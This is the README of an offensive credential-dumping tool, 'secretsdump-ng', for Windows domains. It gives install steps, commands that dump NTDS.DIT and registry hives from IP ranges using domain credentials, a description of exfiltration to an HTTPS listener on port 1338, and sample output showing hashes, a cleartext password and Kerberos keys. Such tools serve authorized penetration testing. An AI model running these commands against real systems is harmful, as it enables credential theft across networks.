# secretsdump-ng

Next-generation credential dumping tool that uses DSInternals for extracting credentials from Windows systems.

## Features

- **NTDS.DIT extraction** using DSInternals on Domain Controllers
- **Registry hive dumping** (SAM, SYSTEM, SECURITY) on all Windows systems
- **Multi-threaded** operations for dumping from multiple hosts
- **Secure transfer of credentials** via HTTPS
- **Formatted output** compatible with standard secretsdump format
- **Filtered extraction** - dump only specific users with `--just-dc-user`

## Installation

```bash
pip install secretsdump-ng
```

### Additional Requirements

You'll also need `exec_across_windows.py` in your working directory or PATH.

System requirements:
- `openssl` (for generating SSL certificates)
- `wget` (for downloading DSInternals)
- Valid domain credentials with appropriate privileges

## Usage

```bash
# Dump all credentials from a single host
secretsdump-ng 192.168.1.10 DOMAIN/username password

# Dump from multiple hosts using IP range
secretsdump-ng 192.168.1.10-20 DOMAIN/username password

# Dump only a specific user
secretsdump-ng 192.168.1.10 DOMAIN/username password --just-dc-user administrator

# Use more threads for faster scanning
secretsdump-ng 192.168.1.1-254 DOMAIN/username password --threads 20

# Verbose output
secretsdump-ng 192.168.1.10 DOMAIN/username password -v
```

## How It Works

1. **Sets up HTTPS server** on port 1338 to receive credential dumps
2. **Executes PowerShell remotely** on target systems using `exec_across_windows.py`
3. **Extracts registry hives** (SAM, SYSTEM, SECURITY) from all Windows systems
4. **Extracts NTDS.DIT** using DSInternals on Domain Controllers
5. **Processes and formats** credentials using impacket-secretsdump
6. **Saves output** to `./secretsdump_ng_out/[IP]/secretsdump.out`

## Output Format

The tool produces output compatible with standard secretsdump:

```
[*] Dumping NTDS.DIT secrets
(admin) Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
user1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
MACHINE$:1002:aad3b435b51404eeaad3b435b51404ee:993e1b083f885e5ef7669286189b7790:::

[*] ClearText passwords grabbed
user2:CLEARTEXT:Password123!

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827:...
```

Admin accounts are highlighted with `(admin)` tag. Machine accounts are sorted to the bottom.

## Security Notes

- Uses temporary SSL certificates for HTTPS transfers
- All credential files are transmitted over encrypted connections
- Temporary files on target systems are stored in `$env:TEMP` and cleaned up after extraction
- Requires appropriate permissions to dump credentials (typically Domain Admin or local Administrator)

## License

MIT License - see LICENSE file for details

## Disclaimer

This tool is intended for authorized security assessments only. Ensure you have proper authorization before using this tool on any systems.